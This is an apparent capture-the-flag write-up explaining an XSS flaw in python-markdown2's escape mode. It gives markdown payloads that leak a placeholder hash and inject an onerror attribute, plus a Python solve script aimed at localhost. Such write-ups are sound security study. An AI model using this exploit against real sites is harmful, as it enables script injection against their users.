# markdown2

The challenge implements a markdown renderer using the `python-markdown2` library, preceded by a `bleach` sanitization pass. Despite the use of `safe_mode="escape"` in `markdown2`, the application is vulnerable to an XSS attack due to the way internal placeholders and code spans are handled.

### Vulnerability Analysis

The core of the vulnerability lies in two behaviors of `markdown2`:

1.  **Incomplete Escaping in Code Spans**: When `safe_mode="escape"` is enabled, `markdown2` escapes characters like `<` and `>`, but it does not escape double quotes (`"`) within code spans.
2.  **Recursive Unhashing**: `markdown2` uses a salted MD5-based placeholder system to protect certain elements (like code spans) from being processed by other rules. These placeholders (e.g., `md5-hash`) are restored at the very end of the conversion process using a recursive search-and-replace loop.

### Exploitation Strategy

#### 1. Information Leak
To exploit the salted hash system, we first need to leak the internal placeholder for our desired payload. The salt is persistent per process, so the hash remains constant across requests to the same worker. We can leak the hash by placing a code span inside a markdown element that escapes its contents before the unhashing phase, such as an image's `alt` attribute:

```markdown
![`" onerror="alert(1)//`]()
```

The renderer processes the code span first, replacing it with `<code>md5-leakedhash</code>`. The image processor then sees this as the `alt` text and escapes it for the attribute, resulting in:
`<img src="" alt="&lt;code&gt;md5-leakedhash&lt;/code&gt;" />`
Since the placeholder was escaped to `&lt;code&gt;...`, the unhashing logic fails to find a match for the full `<code>...</code>` block, leaving the `md5-leakedhash` visible in the output.

#### 2. Attribute Injection
Once we have the hash, we can use it in a second request. We include the same code span (to ensure the hash is populated in the current request's lookup table) and then use the raw `md5-leakedhash` string in a location where it will not be escaped before the unhashing phase, such as an image URL:

```markdown
`" onerror="alert(1)//`
![a](md5-leakedhash)
```

The image processor generates `<img src="md5-leakedhash" alt="a" />`. At the end of the process, the recursive unhashing loop replaces `md5-leakedhash` with the original (unescaped) code span content: `" onerror="alert(1)//`. The final HTML becomes:

```html
<img src="" onerror="alert(1)//" alt="a" />
```

### Solve Script

```python
import requests
import re
import urllib.parse

# Change to the target URL
BASE_URL = "http://localhost:1337"
PAYLOAD = '" onerror="alert(1)//'

def solve():
    # 1. Leak the hash
    leak_payload = f'![`{PAYLOAD}`]()'
    print(f"[*] Leaking hash with payload: {leak_payload}")
    r = requests.get(BASE_URL, params={"markdown": leak_payload})
    
    match = re.search(r'md5-([a-f0-9]{32})', r.text)
    if not match:
        print("[-] Failed to leak hash. Make sure the server is running and accessible.")
        return

    leaked_hash = f"md5-{match.group(1)}"
    print(f"[+] Leaked hash: {leaked_hash}")

    # 2. Exploit using the hash
    # We must include the code span so the hash is added to the internal table,
    # then use the hash in an attribute to trigger the injection.
    exploit_payload = f'`{PAYLOAD}`\n\n![a]({leaked_hash})'
    final_url = f"{BASE_URL}/?markdown={urllib.parse.quote(exploit_payload)}"
    
    print(f"[+] Exploit URL generated:")
    print(final_url)


if __name__ == "__main__":
    solve()
```
